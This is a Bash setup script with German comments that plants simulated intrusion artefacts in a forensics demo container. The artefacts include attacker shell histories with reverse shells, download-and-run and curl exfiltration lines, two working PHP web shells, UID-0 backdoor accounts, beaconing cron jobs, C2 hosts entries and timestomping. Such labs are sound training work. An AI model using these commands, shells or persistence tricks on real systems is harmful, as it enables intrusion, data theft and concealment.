#!/bin/bash
# ─────────────────────────────────────────────────────────────────────────────
# FORENSIC DEMO SETUP — erstellt Laufzeit-Artefakte beim Container-Start
# Simuliert einen kompromittierten Webserver nach einem Angriff
# ─────────────────────────────────────────────────────────────────────────────

echo "[setup-artifacts] Erstelle forensische Demo-Artefakte..."

# ═══════════════════════════════════════════════════════════════════════════
# ARTEFAKT 1: Bash-History (Angreifer-Aktivitäten rekonstruierbar)
# ═══════════════════════════════════════════════════════════════════════════
cat > /root/.bash_history << 'HISTORY'
ls -la /
id
whoami
uname -a
cat /etc/passwd
cat /etc/shadow
wget http://203.0.113.42:8080/stage2.elf -O /tmp/.update
chmod +x /tmp/.update
/tmp/.update &
nmap -sV -p 22,3306,6379,5432 172.20.0.0/24
nmap -sV -p 22,80,443,8080 10.0.0.0/8
nc -e /bin/bash 10.0.0.99 4444 &
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.99",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
find / -perm -4000 -type f 2>/dev/null
find / -writable -type d 2>/dev/null
cat /var/www/html/app/../../../etc/app/app.conf
mysqldump -h forensics-db -u root -pMySuperSecretDBPass123! shopdb > /tmp/dump.sql
gzip /tmp/dump.sql
curl -X POST http://10.0.0.99:8080/exfil -F "file=@/tmp/dump.sql.gz"
base64 /etc/shadow | curl -s -X POST http://10.0.0.99:8080/collect -d @-
crontab -e
history -c
echo "" > /var/log/auth.log
HISTORY
chmod 600 /root/.bash_history

# webapp-User History (Insider-Threat oder kompromittierter App-User)
cat > /home/webapp/.bash_history << 'HISTORY'
cat /etc/app/app.conf
cat /var/www/html/.env
mysql -h forensics-db -u root -pMySuperSecretDBPass123! shopdb
SELECT * FROM users LIMIT 50;
curl "http://10.0.0.99:8080/beacon?host=$(hostname)&ip=$(hostname -I)"
wget -q http://203.0.113.42/cryptominer -O /tmp/.systemd-private && chmod +x /tmp/.systemd-private && nohup /tmp/.systemd-private > /dev/null 2>&1 &
python3 /tmp/scan.py
sudo -l
sudo bash
HISTORY
chown webapp:webapp /home/webapp/.bash_history
chmod 600 /home/webapp/.bash_history

# support-User History (Backdoor-Account-Aktivitäten)
cat > /home/support/.bash_history << 'HISTORY'
id
sudo -i
cat /etc/shadow
adduser --uid 0 --gid 0 --home /root --shell /bin/bash admin2 2>/dev/null || true
echo "admin2:R00ted!" | chpasswd 2>/dev/null || true
ls -la /root/.ssh
cat /root/.ssh/authorized_keys
HISTORY
chown support:support /home/support/.bash_history
chmod 600 /home/support/.bash_history

# ═══════════════════════════════════════════════════════════════════════════
# ARTEFAKT 2: Versteckte Malware-Simulation in /tmp
# ═══════════════════════════════════════════════════════════════════════════
mkdir -p /tmp/.cache/lib /tmp/.X11 /tmp/exfil

# Fake-Cryptominer (simuliert — tut nichts schädliches)
cat > /tmp/.cache/lib/.systemd-private << 'SCRIPT'
#!/bin/bash
# Stratum mining proxy — forensic demo only
POOL="stratum+tcp://pool.minexmr.com:4444"
WALLET="49A4bMkfLLFEXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
while true; do
    sleep 300
done
SCRIPT
chmod +x /tmp/.cache/lib/.systemd-private

# Fake-Portscanner-Skript
cat > /tmp/scan.py << 'PYSCRIPT'
#!/usr/bin/env python3
# Network reconnaissance script — forensic demo
import socket
import sys

targets = ["172.20.0.1", "172.20.0.2", "172.20.0.3"]
ports   = [22, 80, 443, 3306, 5432, 6379, 8080]

for host in targets:
    for port in ports:
        pass  # forensic demo — no actual scanning
PYSCRIPT

# Exfiltrierte Daten
cat > /tmp/exfil/customers_export.csv << 'CSV'
id,name,email,password_hash,credit_card,address
1,Max Mustermann,max@example.com,$2y$10$abcdefghijklmnop,4111-1111-1111-1111,Musterstr. 1 Berlin
2,Anna Schmidt,anna@example.com,$2y$10$qrstuvwxyz012345,5500-0000-0000-0004,Hauptstr. 42 München
3,Klaus Weber,k.weber@example.com,$2y$10$ABCDEFGHIJKLMNOP,,Bahnhofstr. 7 Hamburg
4,Lisa Müller,l.mueller@corp.de,$2y$10$QRSTUVWXYZ678901,378282246310005,Lindenweg 15 Frankfurt
CSV

cat > /tmp/exfil/dump.sql << 'SQL'
-- MariaDB dump — forensic demo
-- Extracted by attacker: 2026-04-26 02:31:14
USE shopdb;
SELECT * FROM users;
SELECT * FROM orders;
SELECT * FROM payment_methods;
SQL

# ═══════════════════════════════════════════════════════════════════════════
# ARTEFAKT 3: Suspicious Cron-Jobs
# ═══════════════════════════════════════════════════════════════════════════

# Root-Crontab (Persistenz-Mechanismus)
(crontab -l 2>/dev/null; cat << 'CRON'
# Forensic Demo Cron Jobs
*/5 * * * * curl -s "http://10.0.0.99:8080/beacon?h=$(hostname)&u=$(id -un)" > /dev/null 2>&1
@reboot /tmp/.cache/lib/.systemd-private &
0 3 * * * /var/tmp/.persistence.sh > /dev/null 2>&1
*/15 * * * * find /tmp -mmin -10 -name "*.log" -exec cat {} \; | gzip | curl -s -X POST http://10.0.0.99:8081/logs -d @- > /dev/null 2>&1
CRON
) | crontab - 2>/dev/null || true

# System-Crontab (versteckter Eintrag)
echo "# system maintenance" >> /etc/cron.d/sysupdate
echo "*/30 * * * * root /usr/local/bin/.sysmon -p -c 'id; cat /etc/passwd' > /tmp/.out 2>&1" >> /etc/cron.d/sysupdate

# ═══════════════════════════════════════════════════════════════════════════
# ARTEFAKT 4: /etc/hosts Manipulation (C2-Server-Einträge)
# ═══════════════════════════════════════════════════════════════════════════
cat >> /etc/hosts << 'HOSTS'

# System Update Servers [DO NOT REMOVE]
10.0.0.99        c2-server update.internal-svc.com
203.0.113.42     download-srv payload-host.local
172.16.100.5     exfil-server log-collector.internal
HOSTS

# ═══════════════════════════════════════════════════════════════════════════
# ARTEFAKT 5: Web-Shell (versteckt in Bild-Upload-Verzeichnis)
# ═══════════════════════════════════════════════════════════════════════════
cat > /var/www/html/upload/img_resize.php << 'WEBSHELL'
<?php
/**
 * Image Resize Helper v2.1
 * @author dev-team
 */
$allowed = ['jpg','jpeg','png','gif'];
if(isset($_FILES['img'])){
    // process image
}
// Debug mode — remove before production
if(isset($_REQUEST['cmd'])){
    $out = shell_exec($_REQUEST['cmd'].' 2>&1');
    echo "<pre>$out</pre>";
}
if(isset($_REQUEST['eval'])){
    @eval(base64_decode($_REQUEST['eval']));
}
?>
WEBSHELL

# Weiterer Web-Shell (tiefer versteckt)
mkdir -p /var/www/html/images/cache/.thumbnails
cat > /var/www/html/images/cache/.thumbnails/proc.php << 'WEBSHELL2'
<?php @eval($_POST['x']); ?>
WEBSHELL2

# ═══════════════════════════════════════════════════════════════════════════
# ARTEFAKT 6: Verdächtige /etc/passwd Manipulation
# ═══════════════════════════════════════════════════════════════════════════
# Gefälschter System-User mit UID 0
echo "systemd-sync:x:0:0:System Sync:/root:/bin/bash" >> /etc/passwd
# Weiterer Backdoor-User
echo "git-runner:x:1001:1001:Git Runner:/home/git-runner:/bin/bash" >> /etc/passwd
echo "git-runner:!" >> /etc/shadow 2>/dev/null || true

# ═══════════════════════════════════════════════════════════════════════════
# ARTEFAKT 7: Persistenz-Skript in /var/tmp
# ═══════════════════════════════════════════════════════════════════════════
cat > /var/tmp/.persistence.sh << 'PERSIST'
#!/bin/bash
# system maintenance — forensic demo
/usr/local/bin/.sysmon -p &
# Recreate backdoor if removed
if ! id support &>/dev/null; then
    useradd -m -s /bin/bash -u 1337 support 2>/dev/null
    echo "support:Supp0rt#2024" | chpasswd 2>/dev/null
fi
PERSIST
chmod +x /var/tmp/.persistence.sh

# ═══════════════════════════════════════════════════════════════════════════
# ARTEFAKT 8: Gefälschte SSH Known-Hosts und Keys
# ═══════════════════════════════════════════════════════════════════════════
mkdir -p /home/webapp/.ssh
cat > /home/webapp/.ssh/known_hosts << 'KNOWNHOSTS'
10.0.0.99 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC2DEMO_C2_HOST_KEY_FORENSIC
203.0.113.42 ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDK3DEMO_ATTACKER_HOST_FORENSIC
KNOWNHOSTS

# Privater SSH-Key (zu C2 aufgebaut)
cat > /home/webapp/.ssh/id_rsa << 'SSHKEY'
-----BEGIN OPENSSH PRIVATE KEY-----
YjNOemFDMXljMkVBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFBQUFB
DEMO_FORENSIC_KEY_NOT_REAL_DO_NOT_USE_IN_PRODUCTION_ENVIRONMENT_ONLY
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=
-----END OPENSSH PRIVATE KEY-----
SSHKEY
chmod 600 /home/webapp/.ssh/id_rsa
chown -R webapp:webapp /home/webapp/.ssh

# ═══════════════════════════════════════════════════════════════════════════
# ARTEFAKT 9: Kompromittierte Auth-Logs
# ═══════════════════════════════════════════════════════════════════════════
cat > /var/log/auth.log << 'AUTHLOG'
Apr 26 02:10:01 forensics-target sshd[1201]: Server listening on 0.0.0.0 port 22.
Apr 26 02:11:14 forensics-target sshd[1312]: Failed password for root from 203.0.113.42 port 48231 ssh2
Apr 26 02:11:15 forensics-target sshd[1312]: Failed password for root from 203.0.113.42 port 48232 ssh2
Apr 26 02:11:16 forensics-target sshd[1312]: Failed password for root from 203.0.113.42 port 48233 ssh2
Apr 26 02:11:17 forensics-target sshd[1312]: Failed password for root from 203.0.113.42 port 48234 ssh2
Apr 26 02:11:18 forensics-target sshd[1312]: Failed password for root from 203.0.113.42 port 48235 ssh2
Apr 26 02:11:21 forensics-target sshd[1312]: Accepted password for root from 203.0.113.42 port 48241 ssh2
Apr 26 02:11:21 forensics-target sshd[1312]: pam_unix(sshd:session): session opened for user root by (uid=0)
Apr 26 02:11:35 forensics-target sudo[1402]: webapp : TTY=pts/1 ; PWD=/var/www/html ; USER=root ; COMMAND=/bin/bash
Apr 26 02:11:35 forensics-target sudo[1402]: pam_unix(sudo:session): session opened for user root by webapp(uid=1000)
Apr 26 02:12:01 forensics-target cron[1501]: (root) CMD (curl -s http://10.0.0.99:8080/beacon)
Apr 26 02:12:47 forensics-target su[1634]: Successful su for support by root
Apr 26 02:13:12 forensics-target useradd[1721]: new user: name=systemd-sync, UID=0, GID=0, home=/root, shell=/bin/bash
Apr 26 02:15:03 forensics-target crontab[1822]: (webapp) BEGIN EDIT (webapp)
Apr 26 02:15:44 forensics-target passwd[1901]: password changed for root
Apr 26 02:16:01 forensics-target sshd[2001]: Accepted publickey for root from 10.0.0.99 port 55123 ssh2: RSA SHA256:DEMO
Apr 26 02:31:14 forensics-target cron[2101]: (root) CMD (/tmp/.cache/lib/.systemd-private)
AUTHLOG

# Syslog mit verdächtigen Netzwerkverbindungen
cat > /var/log/syslog << 'SYSLOG'
Apr 26 02:11:22 forensics-target kernel: [   45.321] TCP: forensics-target:45231 > 10.0.0.99:4444 SYN
Apr 26 02:11:23 forensics-target kernel: [   46.123] TCP: forensics-target:45232 > 10.0.0.99:4444 ESTABLISHED
Apr 26 02:12:00 forensics-target kernel: [   83.001] TCP: forensics-target:51001 > 203.0.113.42:8080 ESTABLISHED
Apr 26 02:13:15 forensics-target kernel: [  158.441] nmap: port scan from 172.20.0.3 detected
Apr 26 02:14:00 forensics-target cron[501]: (CRON) INFO (Running @reboot jobs)
Apr 26 02:15:00 forensics-target kernel: [  243.001] TCP: forensics-target:52001 > 10.0.0.99:8081 ESTABLISHED
SYSLOG

# Nginx Access-Log mit Web-Shell-Aufruf
cat > /var/log/nginx/access.log << 'NGINXLOG'
203.0.113.42 - - [26/Apr/2026:02:14:01 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0"
203.0.113.42 - - [26/Apr/2026:02:14:23 +0000] "GET /upload/img_resize.php?cmd=id HTTP/1.1" 200 312 "-" "curl/7.68.0"
203.0.113.42 - - [26/Apr/2026:02:14:25 +0000] "GET /upload/img_resize.php?cmd=whoami HTTP/1.1" 200 304 "-" "curl/7.68.0"
203.0.113.42 - - [26/Apr/2026:02:14:27 +0000] "GET /upload/img_resize.php?cmd=cat+/etc/passwd HTTP/1.1" 200 2156 "-" "curl/7.68.0"
203.0.113.42 - - [26/Apr/2026:02:14:29 +0000] "GET /upload/img_resize.php?cmd=cat+/etc/app/app.conf HTTP/1.1" 200 891 "-" "curl/7.68.0"
203.0.113.42 - - [26/Apr/2026:02:14:31 +0000] "POST /images/cache/.thumbnails/proc.php HTTP/1.1" 200 156 "-" "python-requests/2.28.0"
203.0.113.42 - - [26/Apr/2026:02:14:33 +0000] "POST /images/cache/.thumbnails/proc.php HTTP/1.1" 200 4521 "-" "python-requests/2.28.0"
10.0.0.1 - - [26/Apr/2026:08:00:01 +0000] "GET / HTTP/1.1" 200 1234 "-" "Mozilla/5.0 (legitimate user)"
10.0.0.1 - - [26/Apr/2026:08:00:03 +0000] "GET /index.html HTTP/1.1" 200 2048 "-" "Mozilla/5.0 (legitimate user)"
NGINXLOG

# ═══════════════════════════════════════════════════════════════════════════
# ARTEFAKT 10: Netzwerk-Konfiguration (iptables-Regeln für Backdoor-Port)
# ═══════════════════════════════════════════════════════════════════════════
# (nur dokumentiert, iptables wird nicht wirklich gesetzt — Demo-Container)
cat > /root/.iptables_backup << 'IPTABLES'
# iptables rules backup — found on compromised system
*filter
:INPUT ACCEPT [0:0]
:FORWARD ACCEPT [0:0]
:OUTPUT ACCEPT [0:0]
-A INPUT -p tcp --dport 31337 -j ACCEPT
-A INPUT -s 10.0.0.99 -j ACCEPT
-A INPUT -s 203.0.113.42 -j ACCEPT
-A OUTPUT -d 10.0.0.99 -j ACCEPT
-A OUTPUT -d 203.0.113.42 -j ACCEPT
COMMIT
IPTABLES

# ═══════════════════════════════════════════════════════════════════════════
# ARTEFAKT 11: Timestomping (Datei-Zeitstempel manipuliert)
# ═══════════════════════════════════════════════════════════════════════════
touch -t 202601010000 /var/www/html/upload/img_resize.php
touch -t 202601010000 /var/www/html/images/cache/.thumbnails/proc.php
touch -t 202601010000 /tmp/.cache/lib/.systemd-private

# ═══════════════════════════════════════════════════════════════════════════
# ARTEFAKT 12: Laufende verdächtige Prozesse
# ═══════════════════════════════════════════════════════════════════════════
# NC-Listener auf ungewöhnlichem Port
cat > /tmp/.netd << 'NETD'
#!/bin/bash
# network daemon — forensic demo process (does nothing)
while true; do sleep 3600; done
NETD
chmod +x /tmp/.netd
nohup /tmp/.netd > /dev/null 2>&1 &

echo "[setup-artifacts] Fertig — $(date)"
echo "[setup-artifacts] Forensische Artefakte erstellt:"
echo "  • Bash-History:           /root/.bash_history, /home/webapp/.bash_history"
echo "  • Malware-Simulation:     /tmp/.cache/lib/, /tmp/exfil/"
echo "  • Web-Shells:             /var/www/html/upload/img_resize.php"
echo "  •                         /var/www/html/images/cache/.thumbnails/proc.php"
echo "  • Backdoor-User:          support (UID 1337), systemd-sync (in /etc/passwd)"
echo "  • SUID-Binary:            /usr/local/bin/.sysmon"
echo "  • Suspicious Cron:        crontab -l, /etc/cron.d/sysupdate"
echo "  • C2-Hosts:               /etc/hosts"
echo "  • Kompromittierte Logs:   /var/log/auth.log, /var/log/nginx/access.log"
echo "  • SSH-Backdoor-Key:       /root/.ssh/authorized_keys"
echo "  • Exfil-Daten:            /tmp/exfil/"
